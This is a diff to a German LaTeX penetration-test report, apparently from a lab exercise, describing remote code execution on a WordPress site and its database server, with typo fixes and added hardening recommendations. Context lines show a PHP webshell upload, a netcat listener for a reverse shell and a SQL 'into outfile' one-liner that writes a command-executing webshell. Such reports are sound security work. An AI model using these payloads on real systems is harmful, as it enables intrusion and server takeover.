@@ -35,9 +35,9 @@ Aus der Webanwendung sind bereits Nutzernamen bekannt. Mit einer Brute-Force Att
 \cvssaddtosummary{Sam's Gärtnerboard: Remote Code Execution (RCE)} 
 
 \subsection*{Proof of concept}
-Durch den zuvor erlangten Admin-Zugriff konnten Einstellungen an der Wordpress-Anwendungen durchgeführt werden. Dadurch konnte der Anwendung das Wordpress-Plugin \textit{Advanced File Manager} hinzugefügt werden. Mit diesem Plugin ist es möglich auf der Konfigrationsseite der WP-Anwendung wie in einem Datei-Explorer Dateien der Anwendung durchsuchen und neue Dateien hochzuladen. Durch den erlangten Admin-Zugriff und das Hinzufügen des WP-Plugins \textit{Advanced File Manager} konnte eine PHP Webshell in das Verzeichnis der Webanwendunge hochgeladen werden. Dadurch ist diese Webshell und der URL \url{http://10.0.68.197/webshell.php} erreichbar. 
+Durch den zuvor erlangten Admin-Zugriff konnten Einstellungen an der Wordpress-Anwendungen durchgeführt werden. Dadurch konnte der Anwendung das Wordpress-Plugin \textit{Advanced File Manager} hinzugefügt werden. Mit diesem Plugin ist es möglich auf der Konfigrationsseite der WP-Anwendung wie in einem Datei-Explorer Dateien der Anwendung durchsuchen und neue Dateien hochzuladen. Durch den erlangten Admin-Zugriff und das Hinzufügen des WP-Plugins \textit{Advanced File Manager} konnte eine PHP Webshell in das Verzeichnis der Webanwendunge hochgeladen werden. Dadurch ist diese Webshell unter der URL \url{http://10.0.68.197/webshell.php} erreichbar. 
 
-Über die hochgeladenen Webshell kann eine Reverse Shell initiiert werden. Dafür muss zunächst ein Netcat-Listener auf dem Angreifer-System mit dem Befehl \texttt{nc -lvp 9001} gestartet werden. Mit dem Befehl aus \autoref{listing:sams-gaertnerboard:reverse-shell} kann sich die Shell auf dem Netcat-Listener verbinden.  Ein Nachweis ist in \autoref{fig:03_sam_proof} dargestellt.
+Über die hochgeladenen Webshell kann eine Reverse Shell initiiert werden. Dafür muss zunächst ein Netcat-Listener auf dem Angreifer-System mit dem Befehl \texttt{nc -lvp 9001} gestartet werden. Mit dem Befehl aus \autoref{listing:sams-gaertnerboard:reverse-shell} kann sich die Shell auf dem Netcat-Listener verbinden. Ein Nachweis ist in \autoref{fig:03_sam_proof} dargestellt.
 
 
 \begin{listing}[!ht]
@@ -75,7 +75,7 @@ Durch den zuvor erlangten administrativen Zugriff auf die Webanwendung \textit{S
 
 
 \cvss{av=network, ac=low, pr=none, ui=required, s=changed, c=high, i=high, a=high}
-\cvssdescription{Durch den SHH-Zugriff auf den Datenbankserver ist es möglich, per SQL-Befehl eine Web Shell hochzuladen und damit eine Reverse Shell zu initiieren.}
+\cvssdescription{Durch den SHH-Zugriff auf den Datenbankserver ist es möglich, per SQL-Befehl eine Webshell hochzuladen und damit eine Reverse Shell zu initiieren.}
 
 \section{\makecvssbadge Datenbank: Remote Code Execution (RCE)}
 \cvssaddtosummary{Sam's Gärtnerboard-DB: Remote Code Execution (RCE)} 
@@ -102,4 +102,7 @@ Select '<?php system($_REQUEST["cmd"]); ?>' into outfile '/var/www/html/web-shel
 \end{figure}
 
 \subsection*{Empfehlungen}
-Empfehlungen
+\begin{itemize}
+    \item Serverkonfiguration: Konfigurieren Sie den Datenbankserver so, dass mit SQL-Befehlen keine oder nur sehr eingeschränkt Dateien in das Dateisystem geschrieben werden können.
+    \item Firewall-Regeln: Beschränken Sie den Zugriff auf den Datenbankserver so, dass nur die notwendigsten Systeme darauf zugreifen können.
+\end{itemize}
